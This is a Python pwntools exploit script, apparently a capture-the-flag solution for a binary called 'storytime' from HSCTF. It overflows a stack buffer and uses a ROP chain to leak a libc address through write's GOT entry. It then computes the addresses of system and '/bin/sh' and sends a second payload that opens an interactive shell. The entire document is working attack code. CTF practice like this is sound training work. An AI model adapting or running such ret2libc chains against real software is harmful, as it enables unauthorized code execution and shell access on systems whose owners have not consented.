from pwn import * 
#target = remote("pwn.hsctf.com", 3333)
target = process("./storytime")
#target = gdb.debug("./storytime", "b * (main + 110)")
pop_rdi = p64(0x0000000000400703)
pop_rsi_r15 = p64(0x0000000000400701)
beginning = p64(0x004005b7)
middle = p64(0x04005d4)
climax = p64(0x0040060e)
end = p64(0x04005f1)
write = p64(0x00000000004004a0)
write_got = p64(0x601018)
ret = p64(0x000000000040048e)

payload =  b"A" * 56
payload += pop_rdi
payload += p64(0x1)
payload += pop_rsi_r15
payload += write_got
payload += p64(0x0)
payload += write
payload += middle
payload += climax

target.sendline(payload)
target.recvuntil(b"story: \n")
leak = int.from_bytes(target.recvn(6)[::-1])

bin_sh = p64(leak + 0xaeecf)
system = p64(leak - 0xc3e10)

payload = b"A" * 56
payload += pop_rdi
payload += bin_sh
payload += ret
payload += system

target.sendline(payload)
target.interactive()
